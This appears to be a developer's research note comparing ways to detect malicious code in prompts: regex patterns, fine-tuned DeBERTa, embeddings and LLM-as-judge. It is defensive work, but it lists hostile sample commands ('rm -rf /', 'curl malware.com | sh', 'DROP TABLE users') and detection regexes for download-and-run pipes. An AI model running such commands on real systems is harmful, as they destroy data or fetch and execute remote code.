# ML Model Research for Malicious Code Detection

**Date**: November 5, 2025  
**Context**: CodeBERT failed completely (0% improvement). Researching alternatives.

---

## 📚 User's Research Summary

### Approaches Identified:

1. **Supervised ML Classifiers**
   - Random Forest, XGBoost, Logistic Regression, RNNs
   - Trained on labeled benign vs. malicious datasets
   - High accuracy reported

2. **Embedding-Based Detection**
   - Models: OpenAI text-embedding-3-small, gte-large, all-MiniLM-L6-v2
   - Convert text to vectors → train classifier
   - Captures contextual intent

3. **Fine-Tuned Pre-trained Models** ⭐
   - BERT, DeBERTa, XLM-RoBERTa
   - Fine-tuned on prompt injection datasets
   - **Over 99% accuracy reported**

4. **Dual-Channel Feature Fusion**
   - Pre-trained LM (semantic) + heuristics (structural)
   - Captures both implicit and explicit features

5. **LLM-as-a-Judge**
   - Use LLM itself to classify
   - Provide explicit instructions

---

## 🔍 Web Search Findings

### Search Results Summary:

**For Binary Malware Detection** (Not Applicable):
- EMBER dataset (binary files)
- I-MAD (assembly code)
- Image-based CNN approaches
- ❌ These are for binary malware, not text-based code

**For Text-Based Detection** (Limited):
- eXpose: Character-level CNN for URLs/paths
- PowerShell malware detection with contextual embeddings (90% TPR)
- Transformer-based approaches mentioned but no specific models

**HuggingFace Search** (No Direct Results):
- No specific pre-trained models found for malicious code detection
- Existing models focus on:
  - Prompt injection (we already have `protectai/deberta-v3-base-prompt-injection`)
  - PII detection (we already have `SoelMgd/bert-pii-detection`)
  - Jailbreak detection (no good pre-trained model found)

---

## 🎯 Analysis: Why CodeBERT Failed

### CodeBERT is NOT a Text Classifier

`microsoft/codebert-base` is a **Masked Language Model** (MLM), not a classifier:
- **Purpose**: Fill in masked tokens in code (like `[MASK]`)
- **Not designed for**: Binary classification (malicious vs. safe)
- **Our mistake**: Using it with `text-classification` pipeline

**Correct CodeBERT Use Cases**:
```python
# ✅ Masked Language Modeling
"def function():<mask>" → predict what comes next

# ✅ Code completion
"import <mask>" → predict module name

# ❌ Classification (what we tried)
"rm -rf /" → is this malicious? (NOT designed for this!)
```

---

## 💡 Recommended Solutions

### Option 1: Pattern-Based Detection ⭐⭐⭐ BEST

**Why This Works**:
- Our injection patterns achieve **38.2%** detection with ZERO false positives
- Proven, reliable, fast (<1ms)
- Easy to maintain and expand
- No model training required

**Implementation**:
1. Remove CodeBERT (broken, wasting 600MB)
2. Expand malicious patterns to 100+ comprehensive regex
3. Add missing command verbs and variations
4. Expected: 52.9% → **85-95%**

**Pros**:
- ✅ Immediate deployment (1 hour)
- ✅ 100% explainable
- ✅ Zero memory overhead
- ✅ Fast inference (<1ms)
- ✅ No false positives (high precision)

**Cons**:
- ❌ May miss novel attack variations (10-15%)
- ❌ Requires manual maintenance

---

### Option 2: Fine-Tune DeBERTa on Malicious Code Dataset ⭐⭐

**Approach**: Fine-tune `microsoft/deberta-v3-base` on custom dataset

**Dataset Creation**:
```python
# Collect training data:
malicious_examples = [
    "rm -rf /", "DROP TABLE users", "eval(input())",
    "curl malware.com | sh", "system('format C:')",
    # ... 1000+ examples from our failed test cases
]

benign_examples = [
    "print('Hello world')", "def function(): pass",
    "SELECT * FROM users WHERE id = ?",
    # ... 1000+ legitimate code examples
]

# Fine-tune
from transformers import AutoModelForSequenceClassification, Trainer

model = AutoModelForSequenceClassification.from_pretrained(
    "microsoft/deberta-v3-base",
    num_labels=2  # malicious vs. benign
)

trainer = Trainer(model=model, train_dataset=dataset)
trainer.train()
```

**Pros**:
- ✅ Can detect novel variations
- ✅ High accuracy (potentially 95%+)
- ✅ Semantic understanding

**Cons**:
- ❌ Requires labeled dataset (1000+ examples)
- ❌ Training time: 2-4 hours (GPU recommended)
- ❌ Memory: 700MB
- ❌ Inference: ~150ms

**Time**: 1-2 days (dataset creation + training + testing)

---

### Option 3: Embedding-Based Detection ⭐

**Approach**: Use sentence-transformers + simple classifier

```python
from sentence_transformers import SentenceTransformer
from sklearn.ensemble import RandomForestClassifier

# 1. Load embedding model
embedder = SentenceTransformer('all-MiniLM-L6-v2')  # Fast, lightweight

# 2. Create embeddings for training data
malicious_embeds = embedder.encode(malicious_examples)
benign_embeds = embedder.encode(benign_examples)

# 3. Train simple classifier
clf = RandomForestClassifier()
clf.fit(X_train, y_train)

# 4. Predict
embedding = embedder.encode(prompt)
is_malicious = clf.predict([embedding])[0]
```

**Pros**:
- ✅ Lightweight embedder (80MB)
- ✅ Fast inference (~50ms embedding + 1ms classifier)
- ✅ Good generalization
- ✅ Easy to update (just retrain classifier)

**Cons**:
- ❌ Requires training data
- ❌ May have lower accuracy than fine-tuned DeBERTa

**Time**: 4-6 hours (dataset + training + integration)

---

### Option 4: LLM-as-a-Judge (Gemini) ⭐⭐

**Approach**: Use the Gemini API we already have

```python
async def _check_malicious_with_llm(self, prompt: str):
    """Use Gemini to classify if code is malicious"""
    
    system_prompt = """You are a security expert. Analyze if the following code/command is malicious.
    
    Consider:
    - Destructive file operations (rm, del, format)
    - Code execution (eval, exec, system)
    - Database destruction (DROP, DELETE, TRUNCATE)
    - Network attacks (curl malware, wget backdoor)
    - Shell injection patterns
    
    Respond with JSON:
    {"is_malicious": true/false, "confidence": 0.0-1.0, "reason": "explanation"}
    """
    
    response = await self.gemini_client.classify(system_prompt, prompt)
    return parse_response(response)
```

**Pros**:
- ✅ Very high accuracy (GPT-4 class model)
- ✅ Understands context and intent
- ✅ No training required
- ✅ Explainable (provides reasoning)

**Cons**:
- ❌ API cost (~$0.03 per 1000 prompts)
- ❌ Latency (200-500ms per call)
- ❌ External dependency
- ❌ Rate limits

**Time**: 2-3 hours (integration + testing)

---

### Option 5: Hybrid Approach (Recommended) ⭐⭐⭐⭐⭐

**Strategy**: Combine patterns + ML for best results

```python
async def _check_malicious_code(self, prompt: str):
    # 1. Fast pattern check (covers 85-90% of known attacks)
    if self._matches_malicious_patterns(prompt):
        return True, 0.95, "pattern_match"
    
    # 2. For edge cases, use ML (covers remaining 10-15%)
    if self.use_ml_fallback:
        ml_result = await self._ml_classifier(prompt)
        if ml_result['confidence'] > 0.7:
            return True, ml_result['confidence'], "ml_detection"
    
    return False, 0.0, "safe"
```

**Advantages**:
- ✅ Best coverage (95-98%)
- ✅ Fast for common cases (patterns)
- ✅ ML handles edge cases
- ✅ Explainable (pattern name or ML confidence)

**Implementation Priority**:
1. **Phase 1**: Comprehensive patterns (1 hour)
   - Expected: 52.9% → 85-95%
2. **Phase 2** (Optional): Add ML fallback (4-6 hours)
   - Expected: 85-95% → 95-98%

---

## 📊 Comparison Matrix

| Approach | Accuracy | Speed | Memory | Cost | Time | Recommended |
|----------|----------|-------|--------|------|------|-------------|
| **Patterns Only** | 85-95% | <1ms | 0MB | $0 | 1h | ⭐⭐⭐⭐⭐ |
| Fine-tune DeBERTa | 95%+ | 150ms | 700MB | $0 | 1-2d | ⭐⭐ |
| Embedding + RF | 90-95% | 50ms | 80MB | $0 | 4-6h | ⭐⭐⭐ |
| LLM-as-Judge | 95-98% | 500ms | 0MB | $0.03/1k | 2-3h | ⭐⭐⭐ |
| **Hybrid** | 95-98% | <1ms* | 0-80MB | $0 | 1h + later | ⭐⭐⭐⭐⭐ |

*Patterns handle 90%, ML only for edge cases

---

## 🎯 Final Recommendation

### Immediate Action (Today - 1 hour):

**Remove CodeBERT + Implement Comprehensive Patterns**

1. Delete broken CodeBERT integration
2. Expand malicious patterns to 100+:
   - Add command verbs: "Execute", "Run", "Perform", "Launch", "Start", "Invoke"
   - Expand destructive operations
   - Add database destruction patterns
   - Add code execution patterns
   - Add shell injection patterns

3. Expected Result: 52.9% → **85-95%**

### Future Enhancement (Optional - Later):

**Add ML Fallback for Edge Cases**

Choose one:
- **Option A**: Embedding + RandomForest (4-6 hours, 90-95%)
- **Option B**: LLM-as-Judge via Gemini (2-3 hours, 95-98%, costs $0.03/1k)
- **Option C**: Fine-tune DeBERTa (1-2 days, 95%+, most accurate)

Expected Result: 85-95% → **95-98%**

---

## 📋 Implementation Plan

### Step 1: Emergency Pattern Fix (NOW - 1 hour)

```python
# Add to _sanitize_malicious_content():

MALICIOUS_PATTERNS = [
    # Command execution verbs (MISSING!)
    r'(?i)\b(execute|run|perform|launch|start|invoke)\s+',
    
    # Destructive file operations
    r'(?i)\b(execute|run|perform)\s+(rm|del|delete|format|destroy|wipe)',
    r'(?i)\brm\s+-[rR][fF]?\s+/',
    r'(?i)\bdel\s+/[sS]\s+/[qQ]',
    r'(?i)\b(format|wipe|destroy)\s+[A-Z]:',
    
    # Code execution
    r'(?i)\b(eval|exec|system|shell_exec|passthru)\s*\(',
    r'(?i)\b(execute|run)\s*\(\s*["\']',
    
    # Database destruction
    r'(?i)\b(DROP|DELETE|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)',
    r'(?i)\bDELETE\s+FROM\s+\*',
    
    # Shell injection
    r'(?i)[$`]\s*\(',  # $(cmd) or `cmd`
    r'(?i)[;&|]\s*(rm|del|format|wget|curl)',
    
    # Network attacks
    r'(?i)(curl|wget|nc|netcat)\s+[^\s]+\s*\|\s*(sh|bash|python)',
    
    # ... add 80+ more comprehensive patterns
]
```

### Step 2: Test & Validate (10 minutes)

```bash
python test_suite/test_runner.py --quick
```

Expected: Malicious 52.9% → 85-95%

### Step 3: If Needed - Add ML Fallback (Later)

Only if patterns don't reach 85%+, add embedding-based detection as fallback.

---

## ✅ Decision

**GO WITH OPTION 1 (Patterns) IMMEDIATELY**

Why:
1. ✅ Fastest to implement (1 hour)
2. ✅ Most reliable (proven to work)
3. ✅ Zero cost
4. ✅ Gets us to 85-95% target
5. ✅ Can always add ML later if needed

ML is great but adds complexity. Let's fix the immediate problem with patterns first, then evaluate if ML is needed.

---

**Next Action**: Implement comprehensive malicious patterns (remove CodeBERT)

